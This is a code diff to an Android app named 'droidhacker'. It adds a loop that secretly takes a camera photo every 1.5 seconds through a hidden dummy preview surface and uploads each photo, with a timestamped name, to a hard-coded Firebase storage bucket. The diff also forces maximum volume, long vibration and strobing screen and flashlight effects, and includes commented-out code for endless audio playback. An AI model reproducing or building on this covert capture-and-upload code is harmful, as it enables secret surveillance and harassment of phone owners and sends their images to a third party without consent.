@@ -3,6 +3,7 @@ package com.example.erickwendel.droidhacker;
 import android.app.AlertDialog;
 import android.content.Context;
 import android.content.DialogInterface;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -12,6 +13,7 @@ import android.media.AudioManager;
 import android.media.MediaPlayer;
 import android.net.Uri;
 import android.os.Handler;
+import android.os.Vibrator;
 import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -31,6 +33,8 @@ import com.google.firebase.storage.UploadTask;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.util.Calendar;
+import java.util.Date;
 
 
 public class Main2Activity extends AppCompatActivity {
@@ -43,12 +47,14 @@ public class Main2Activity extends AppCompatActivity {
     private Camera camera;
     private boolean isFlashOn;
     private boolean hasFlash;
-    private AudioManager audio;
     Camera.Parameters params;
 
     private ImageView img_warn1;
     private ImageView img_warn2;
 
+    private AudioManager audio;
+    private MediaPlayer mp;
+    private Handler handler;
 
     @Override
     public boolean onKeyDown(int keyCode, KeyEvent event) {
@@ -65,25 +71,38 @@ public class Main2Activity extends AppCompatActivity {
         } else
             return super.onKeyDown(keyCode, event);
     }
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main2);
-        takePhoto();
-        layout = getWindow().getAttributes();
-        final Handler h = new Handler();
-        h.postDelayed(new Runnable()
-        {
+
+        final Handler hxzy1 = new Handler();
+        hxzy1.postDelayed(new Runnable() {
 
             @Override
-            public void run()
-            {
-                if(value == 1) {
+            public void run() {
+                takePhoto();
+
+                getWindow().setAttributes(layout);
+
+                hxzy1.postDelayed(this, 1500);
+            }
+        }, 1500);
+
+
+        layout = getWindow().getAttributes();
+        final Handler h = new Handler();
+        h.postDelayed(new Runnable() {
+
+            @Override
+            public void run() {
+                if (value == 1) {
                     layout.screenBrightness = 0F;
                     value = 0;
                 } else {
                     layout.screenBrightness = 1F;
-                    value =1;
+                    value = 1;
                 }
 
                 getWindow().setAttributes(layout);
@@ -93,17 +112,15 @@ public class Main2Activity extends AppCompatActivity {
         }, 1000);
 
         final Handler hx = new Handler();
-        hx.postDelayed(new Runnable()
-        {
+        hx.postDelayed(new Runnable() {
 
             @Override
-            public void run()
-            {
-                if(value2 == 1) {
+            public void run() {
+                if (value2 == 1) {
                     value2 = 0;
                     turnOnFlash();
                 } else {
-                    value2 =1;
+                    value2 = 1;
                     turnOffFlash();
                 }
 
@@ -140,17 +157,15 @@ public class Main2Activity extends AppCompatActivity {
         img_warn2 = (ImageView) findViewById(R.id.img_warn2);
 
         final Handler hxz = new Handler();
-        hxz.postDelayed(new Runnable()
-        {
+        hxz.postDelayed(new Runnable() {
 
             @Override
-            public void run()
-            {
-                if(value3 == 1) {
+            public void run() {
+                if (value3 == 1) {
                     value3 = 0;
                     img_warn1.setVisibility(View.INVISIBLE);
                 } else {
-                    value3 =1;
+                    value3 = 1;
                     img_warn1.setVisibility(View.VISIBLE);
                 }
 
@@ -161,17 +176,15 @@ public class Main2Activity extends AppCompatActivity {
         }, 100);
 
         final Handler hxzy = new Handler();
-        hxzy.postDelayed(new Runnable()
-        {
+        hxzy.postDelayed(new Runnable() {
 
             @Override
-            public void run()
-            {
-                if(value4 == 1) {
+            public void run() {
+                if (value4 == 1) {
                     value4 = 0;
                     img_warn2.setVisibility(View.INVISIBLE);
                 } else {
-                    value4 =1;
+                    value4 = 1;
                     img_warn2.setVisibility(View.VISIBLE);
                 }
 
@@ -181,8 +194,29 @@ public class Main2Activity extends AppCompatActivity {
             }
         }, 100);
 
+        audio = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
 
+        Intent intent1 = new Intent("usb_detect");
+        sendBroadcast(intent1);
 
+        audio = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+        audio.setStreamVolume(AudioManager.STREAM_MUSIC, audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
+
+        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+        v.vibrate(10550000);
+
+//        Uri notification = Uri.parse("android.resource://com.example.erickwendel.droidhacker/" + R.raw.gemidao);
+//        mp = MediaPlayer.create(this, notification);
+//
+//        mp.setLooping(true);
+//        mp.start();
+//
+//        while (true) {
+//
+//            if (mp.isPlaying()) continue;
+//            mp.setLooping(true);
+//            mp.start();
+//        }
     }
 
     // Get the camera
@@ -233,7 +267,6 @@ public class Main2Activity extends AppCompatActivity {
     }
 
 
-
     @Override
     protected void onDestroy() {
         super.onDestroy();
@@ -257,7 +290,7 @@ public class Main2Activity extends AppCompatActivity {
         super.onResume();
 
         // on resume turn on the flash
-        if(hasFlash)
+        if (hasFlash)
             turnOnFlash();
     }
 
@@ -303,7 +336,6 @@ public class Main2Activity extends AppCompatActivity {
                 System.out.println("Could not get camera instance");
             } else {
                 System.out.println("Got the camera, creating the dummy surface texture");
-                SurfaceTexture dummySurfaceTextureF = new SurfaceTexture(0);
                 try {
 
                     camerax.setPreviewTexture(new SurfaceTexture(0));
@@ -323,8 +355,11 @@ public class Main2Activity extends AppCompatActivity {
 
 
                         Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
+                        Bitmap resized = Bitmap.createScaledBitmap(bitmap, (int) (bitmap.getWidth() * 0.8), (int) (bitmap.getHeight() * 0.3), true);
+
                         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
+//                        resized.compress(Bitmap.CompressFormat.PNG, 20, byteArrayOutputStream);
+
                         byte[] byteArray = byteArrayOutputStream.toByteArray();
 
                         String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
@@ -333,13 +368,15 @@ public class Main2Activity extends AppCompatActivity {
 //                        image.setImageBitmap(bitmap);
 
                         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
+                        resized.compress(Bitmap.CompressFormat.PNG, 20, baos);
 
                         camerax.release();
 
+                        Date currentTime = Calendar.getInstance().getTime();
+
                         FirebaseStorage storage = FirebaseStorage.getInstance();
                         StorageReference storageRef = storage.getReferenceFromUrl("gs://saveimagetofirebase.appspot.com");
-                        StorageReference mountainsRef = storageRef.child("mountains.jpg");
+                        StorageReference mountainsRef = storageRef.child(currentTime + ".jpg");
 
                         UploadTask uploadTask = mountainsRef.putBytes(baos.toByteArray());
                         uploadTask.addOnFailureListener(new OnFailureListener() {
@@ -353,6 +390,11 @@ public class Main2Activity extends AppCompatActivity {
                                 // taskSnapshot.getMetadata() contains file metadata such as size, content-type, and download URL.
                                 Uri downloadUrl = taskSnapshot.getDownloadUrl();
                                 Log.e("downloadUrl", downloadUrl.toString());
+
+//                                FirebaseDatabase database = FirebaseDatabase.getInstance();
+//                                DatabaseReference myRef = database.getReference("message");
+//
+//                                myRef.setValue(downloadUrl.toString());
                             }
                         });
 //
